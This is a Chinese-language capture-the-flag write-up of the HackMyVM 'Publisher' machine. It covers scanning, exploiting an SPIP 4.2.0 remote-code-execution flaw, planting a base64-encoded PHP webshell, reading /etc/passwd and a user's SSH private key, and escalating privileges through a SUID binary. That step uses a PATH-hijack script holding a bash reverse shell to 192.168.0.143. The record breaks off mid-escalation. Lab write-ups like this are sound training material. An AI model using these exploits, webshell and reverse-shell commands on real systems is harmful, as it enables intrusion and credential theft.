---
title: Publisher
author: hgbe02
date: 2024-07-10 17:20:00 +0800
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/publisher.html"
---

# Publisher

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407101724881.png" alt="image-20240710140036757" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407101724882.png" alt="image-20240710140611418" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
┌──(kali💀kali)-[~/temp/publisher]
└─$ rustscan -a $IP -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.0.188:80
Open 192.168.0.188:22

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMc4hLykriw3nBOsKHJK1Y6eauB8OllfLLlztbB4tu4c9cO8qyOXSfZaCcb92uq/Y3u02PPHWq2yXOLPler1AFGVhuSfIpokEnT2jgQzKL63uJMZtoFzL3RW8DAzunrHhi/nQqo8sw7wDCiIN9s4PDrAXmP6YXQ5ekK30om9kd5jHG6xJ+/gIThU4ODr/pHAqr28bSpuHQdgphSjmeShDMg8wu8Kk/B0bL2oEvVxaNNWYWc1qHzdgjV5HPtq6z3MEsLYzSiwxcjDJ+EnL564tJqej6R69mjII1uHStkrmewzpiYTBRdgi9A3Yb+x8NxervECFhUR2MoR1zD+0UJbRA2v1LQaGg9oYnYXNq3Lc5c4aXz638wAUtLtw2SwTvPxDrlCmDVtUhQFDhyFOu9bSmPY0oGH5To8niazWcTsCZlx2tpQLhF/gS3jP/fVw+H6Eyz/yge3RYeyTv3ehV6vXHAGuQLvkqhT6QS21PLzvM7bCqmo1YIqHfT2DLi7jZxdk=
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJNL/iO8JI5DrcvPDFlmqtX/lzemir7W+WegC7hpoYpkPES6q+0/p4B2CgDD0Xr1AgUmLkUhe2+mIJ9odtlWW30=
|   256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFG/Wi4PUTjReEdk2K4aFMi8WzesipJ0bp0iI0FM8AfE
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Publisher's Pulse: SPIP Insights & Tips
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 目录扫描

```bash
┌──(kali💀kali)-[~/temp/publisher]
└─$ gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip,bak,txt,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.188/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,zip,bak,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/images               (Status: 301) [Size: 315] [--> http://192.168.0.188/images/]
/.php                 (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 8686]
/spip                 (Status: 301) [Size: 313] [--> http://192.168.0.188/spip/]
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 1323360 / 1323366 (100.00%)
===============================================================
Finished
===============================================================
```

## 漏洞发现

### 踩点

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407101724884.png" alt="image-20240710140954527" style="zoom:50%;" />

### 敏感目录

```bash
http://192.168.0.188/spip/
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407101724885.png" alt="image-20240710141506863" style="zoom:50%;" />

### spip漏洞

看上去是一个组件，尝试进行漏洞搜集：

```bash
┌──(kali💀kali)-[~/temp/publisher]
└─$ whatweb http://$IP/spip
http://192.168.0.188/spip [301 Moved Permanently] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.0.188], RedirectLocation[http://192.168.0.188/spip/], Title[301 Moved Permanently]
http://192.168.0.188/spip/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.0.188], MetaGenerator[SPIP 4.2.0], SPIP[4.2.0][http://192.168.0.188/spip/local/config.txt], Script[text/javascript], Title[Publisher], UncommonHeaders[composed-by,link,x-spip-cache]
```

发现 SPIP 版本号，尝试进行搜集：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407101724886.png" alt="image-20240710141759767" style="zoom:50%;" />

下载下来尝试利用，但是不行，尝试搜索一下github是否存在相关POC：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407101724887.png" alt="image-20240710142048719" style="zoom: 33%;" />

发现上下俩是一样的，尝试执行以下看看能不能执行命令：

```bash
┌──(kali💀kali)-[~/temp/publisher]
└─$ python3 51536.py -u http://$IP/spip -c 'echo 1 > test'

┌──(kali💀kali)-[~/temp/publisher]
└─$ curl http://$IP/spip/test
1
```

直接上传反弹shell，但是弹不回来，尝试编码后写入webshell：

```bash
┌──(kali💀kali)-[~/temp/publisher]
└─$ python3 51536.py -u http://$IP/spip -c 'echo "PD89YCRfR0VUWzBdYD8+" | base64 -d > webshell.php'

┌──(kali💀kali)-[~/temp/publisher]
└─$ curl http://$IP/spip/webshell.php                                                                                  

┌──(kali💀kali)-[~/temp/publisher]
└─$ curl http://$IP/spip/webshell.php?0=whoami
www-data
```

尝试多个，如php，python，bash，netcat等反弹shell的payload但是都不行，尝试搜索一下相关文件：

```bash
┌──(kali💀kali)-[~/temp/publisher]
└─$ curl http://$IP/spip/webshell.php?0=ls+-la
total 164
drwxr-xr-x 11 www-data www-data  4096 Jul 10 06:40 .
drwxr-x---  5 www-data www-data  4096 Dec 20  2023 ..
-rwxr-xr-x  1 www-data www-data  7045 Dec 20  2023 CHANGELOG.md
drwxr-xr-x  3 www-data www-data  4096 Dec 20  2023 IMG
-rwxr-xr-x  1 www-data www-data 35147 Dec 20  2023 LICENSE
-rwxr-xr-x  1 www-data www-data   842 Dec 20  2023 README.md
-rwxr-xr-x  1 www-data www-data   178 Dec 20  2023 SECURITY.md
-rwxr-xr-x  1 www-data www-data  1761 Dec 20  2023 composer.json
-rwxr-xr-x  1 www-data www-data 27346 Dec 20  2023 composer.lock
drwxr-xr-x  3 www-data www-data  4096 Dec 20  2023 config
drwxr-xr-x 22 www-data www-data  4096 Dec 20  2023 ecrire
-rwxr-xr-x  1 www-data www-data  4307 Dec 20  2023 htaccess.txt
-rwxr-xr-x  1 www-data www-data    42 Dec 20  2023 index.php
drwxr-xr-x  5 www-data www-data  4096 Dec 20  2023 local
drwxr-xr-x 22 www-data www-data  4096 Dec 20  2023 plugins-dist
-rwxr-xr-x  1 www-data www-data  3645 Dec 20  2023 plugins-dist.json
drwxr-xr-x 12 www-data www-data  4096 Dec 20  2023 prive
-rwxr-xr-x  1 www-data www-data   973 Dec 20  2023 spip.php
-rwxr-xr-x  1 www-data www-data  1212 Dec 20  2023 spip.png
-rwxr-xr-x  1 www-data www-data  1673 Dec 20  2023 spip.svg
drwxr-xr-x 10 www-data www-data  4096 Dec 20  2023 squelettes-dist
-rw-rw-rw-  1 www-data www-data    22 Jul 10 06:30 test
drwxr-xr-x  6 www-data www-data  4096 Jul 10 06:16 tmp
drwxr-xr-x  6 www-data www-data  4096 Dec 20  2023 vendor
-rw-rw-rw-  1 www-data www-data    15 Jul 10 06:40 webshell.php

┌──(kali💀kali)-[~/temp/publisher]
└─$ curl http://$IP/spip/webshell.php?0=cat+/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
think:x:1000:1000::/home/think:/bin/sh

┌──(kali💀kali)-[~/temp/publisher]
└─$ curl http://$IP/spip/webshell.php?0=cat+/home/think/user.txt
fa229046d44eda6a3598c73ad96f4ca5  

┌──(kali💀kali)-[~/temp/publisher]
└─$ curl http://$IP/spip/webshell.php?0=cat+/home/think/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

尝试用私钥进行连接：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407101724888.png" alt="image-20240710145347622" style="zoom:50%;" />

## 提权

### 信息搜集

```bash
think@publisher:~$ ls -la
total 48
drwxr-xr-x 8 think    think    4096 Feb 10 21:27 .
drwxr-xr-x 3 root     root     4096 Nov 13  2023 ..
lrwxrwxrwx 1 root     root        9 Jun 21  2023 .bash_history -> /dev/null
-rw-r--r-- 1 think    think     220 Nov 14  2023 .bash_logout
-rw-r--r-- 1 think    think    3771 Nov 14  2023 .bashrc
drwx------ 2 think    think    4096 Nov 14  2023 .cache
drwx------ 3 think    think    4096 Dec  8  2023 .config
drwx------ 3 think    think    4096 Feb 10 21:22 .gnupg
drwxrwxr-x 3 think    think    4096 Jan 10 12:46 .local
-rw-r--r-- 1 think    think     807 Nov 14  2023 .profile
lrwxrwxrwx 1 think    think       9 Feb 10 21:27 .python_history -> /dev/null
drwxr-x--- 5 www-data www-data 4096 Dec 20  2023 spip
drwxr-xr-x 2 think    think    4096 Jan 10 12:54 .ssh
-rw-r--r-- 1 root     root       35 Feb 10 21:20 user.txt
lrwxrwxrwx 1 think    think       9 Feb 10 21:27 .viminfo -> /dev/null
think@publisher:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/usr/sbin/pppd
/usr/sbin/run_container
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount
think@publisher:~$ ls -la /usr/sbin/run_container
-rwsr-sr-x 1 root root 16760 Nov 14  2023 /usr/sbin/run_container
think@publisher:~$ ls -la /usr/bin/fusermount
-rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount
think@publisher:~$ echo 'whoami' | at now
warning: commands will be executed using /bin/sh
job 1 at Wed Jul 10 06:59:00 2024
```

### 分析程序

找到一个`suid`文件，看一下是个啥情况：

```bash
think@publisher:~$ strings /usr/sbin/run_container
/lib64/ld-linux-x86-64.so.2
libc.so.6
__stack_chk_fail
execve
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
GLIBC_2.4
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
/bin/bash
/opt/run_container.sh
:*3$"
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8061
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
run_container.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
__stack_chk_fail@@GLIBC_2.4
__libc_start_main@@GLIBC_2.2.5
execve@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```

发现存在敏感的`/bin/bash`和`/opt/run_container.sh`，可能是要执行的！

```bash
think@publisher:~$ ls -la /opt/run_container.sh
-rwxrwxrwx 1 root root 1715 Mar 29 13:25 /opt/run_container.sh
think@publisher:~$ cat /opt/run_container.sh
cat: /opt/run_container.sh: Permission denied
think@publisher:~$ ls -la /opt
ls: cannot open directory '/opt': Permission denied
think@publisher:~$ getfacl /opt
getfacl: Removing leading '/' from absolute path names
# file: opt
# owner: root
# group: root
user::rwx
group::r-x
other::r-x
```

啥情况咋读取不了。。。。尝试运行一下，发现权限也不够。。。。传到本地试试：

```bash
think@publisher:/tmp$ cp /usr/sbin/run_container .
```

然后传过来，反编译一下：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rbp
  int result; // eax
  unsigned __int64 v5; // rdx
  unsigned __int64 v6; // rt1
  const char *v7; // [rsp-38h] [rbp-38h]
  const char *v8; // [rsp-30h] [rbp-30h]
  const char *v9; // [rsp-28h] [rbp-28h]
  const char *v10; // [rsp-20h] [rbp-20h]
  __int64 v11; // [rsp-18h] [rbp-18h]
  unsigned __int64 v12; // [rsp-10h] [rbp-10h]
  __int64 v13; // [rsp-8h] [rbp-8h]

  __asm { endbr64 }
  v13 = v3;
  v12 = __readfsqword(0x28u);
  v7 = "/bin/bash";
  v8 = "-p";
  v9 = "/opt/run_container.sh";
  v10 = argv[1];
  v11 = 0LL;
  sub_1070("/bin/bash", &v7, 0LL);
  result = 0;
  v6 = __readfsqword(0x28u);
  v5 = v6 ^ v12;
  if ( v6 != v12 )
    result = sub_1060("/bin/bash", &v7, v5);
  return result;
}
```

好像是调用了bash，然后运行程序？这个时候意识到think用户并不是bash。。。

```bash
think@publisher:/tmp$ env
SHELL=/usr/sbin/ash
PWD=/tmp
LOGNAME=think
XDG_SESSION_TYPE=tty
MOTD_SHOWN=pam
HOME=/home/think
LANG=en_US.UTF-8
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=192.168.0.143 47128 192.168.0.188 22
LESSCLOSE=/usr/bin/lesspipe %s %s
XDG_SESSION_CLASS=user
TERM=xterm-256color
LESSOPEN=| /usr/bin/lesspipe %s
USER=think
SHLVL=2
XDG_SESSION_ID=7
XDG_RUNTIME_DIR=/run/user/1000
SSH_CLIENT=192.168.0.143 47128 22
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
SSH_TTY=/dev/pts/0
_=/usr/bin/env
OLDPWD=/home/think
think@publisher:/tmp$ cat /etc/passwd | grep "think"
think:x:1000:1000:,,,:/home/think:/usr/sbin/ash
```

是个ash，尝试搞到bash。。。。。上传linpeas.sh.

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407101724889.png" alt="image-20240710155711561" style="zoom: 50%;" />

还是不知道咋整，尝试弹到`pwncat-cs`试试：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407101724890.png" alt="image-20240710160527018" style="zoom:50%;" />

不能自动处理到bash。。。。。寄，尝试执行了一下。发现`.sh`居然可以执行。。。。

```bash
think@publisher:~$ /opt/run_container.sh
permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json?all=1": dial unix /var/run/docker.sock: connect: permission denied
docker: permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Post "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/create": dial unix /var/run/docker.sock: connect: permission denied.
See 'docker run --help'.
List of Docker containers:
permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json?all=1": dial unix /var/run/docker.sock: connect: permission denied

Enter the ID of the container or leave blank to create a new one: 123456
/opt/run_container.sh: line 16: validate_container_id: command not found

OPTIONS:
1) Start Container
2) Stop Container
3) Restart Container
4) Create Container
5) Quit
Choose an action for a container: 
```

显示需要一个`ID`，且是docker进行运行的。。。发现有个命令找不到，进行劫持一下：

```bash
think@publisher:/tmp$ touch validate_container_id
think@publisher:/tmp$ nano validate_container_id
think@publisher:/tmp$ cat validate_container_id 
#!/bin/bash

bash -i &>/dev/tcp/192.168.0.143/1234 <&1
think@publisher:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
think@publisher:/tmp$ PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/tmp
think@publisher:/tmp$ cd /
think@publisher:/$ validate_container_id
-ash: /tmp/validate_container_id: Permission denied
```

尝试执行命令！

```bash
think@publisher:/$ /opt/run_container.sh
permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json?all=1": dial unix /var/run/docker.sock: connect: permission denied
docker: permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Post "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/create": dial unix /var/run/docker.sock: connect: permission denied.
See 'docker run --help'.
List of Docker containers:
permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json?all=1": dial unix /var/run/docker.sock: connect: permission denied

Enter the ID of the container or leave blank to create a new one: 123456
/opt/run_container.sh: line 16: /tmp/validate_container_id: Permission denied

OPTIONS:
1) Start Container
2) Stop Container
3) Restart Container
4) Create Container
5) Quit
Choose an action for a container: 1
permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Post "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/123456/start": dial unix /var/run/docker.sock: connect: permission denied
Error: failed to start containers: 123456
```

发现找不到，（看群友的wp发现的）尝试看一下前面的SPIP得到的那个是不是有：

```bash
┌──(kali💀kali)-[~]
└─$ curl "http://$IP/spip/webshell.php?0=whoami;id;hostname"
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
41c976e507f8
```

找到ID，尝试执行，但是没效果，赋予执行权限！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407101724891.png" alt="image-20240710171715758" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407101724892.png" alt="image-20240710171726046" style="zoom:50%;" />

发现可以读取了，尝试修改！

### bash -p

接下来就可以正常修改，执行前面的suid文件进行提权了！

```bash
(remote) think@publisher:/tmp$ cat /opt/run_container.sh
#!/bin/bash

# Function to list Docker containers
list_containers() {
    if [ -z "$(docker ps -aq)" ]; then
        docker run -d --restart always -p 8000:8000 -v /home/think:/home/think 4b5aec41d6ef;
    fi
    echo "List of Docker containers:"
    docker ps -a --format "ID: {{.ID}} | Name: {{.Names}} | Status: {{.Status}}"
    echo ""
}

# Function to prompt user for container ID
prompt_container_id() {
    read -p "Enter the ID of the container or leave blank to create a new one: " container_id
    validate_container_id "$container_id"
}

# Function to display options and perform actions
select_action() {
    echo ""
    echo "OPTIONS:"
    local container_id="$1"
    PS3="Choose an action for a container: "
    options=("Start Container" "Stop Container" "Restart Container" "Create Container" "Quit")

    select opt in "${options[@]}"; do
        case $REPLY in
            1) docker start "$container_id"; break ;;
            2)  if [ $(docker ps -q | wc -l) -lt 2 ]; then
                    echo "No enough containers are currently running."
                    exit 1
                fi
                docker stop "$container_id"
                break ;;
            3) docker restart "$container_id"; break ;;
            4) echo "Creating a new container..."
               docker run -d --restart always -p 80:80 -v /home/think:/home/think spip-image:latest 
               break ;;
            5) echo "Exiting..."; exit ;;
            *) echo "Invalid option. Please choose a valid option." ;;
        esac
    done
}

# Main script execution
list_containers
prompt_container_id  # Get the container ID from prompt_container_id function
select_action "$container_id"  # Pass the container ID to select_action function
(remote) think@publisher:/tmp$ echo '#!/bin/bash' > /opt/run_container.sh
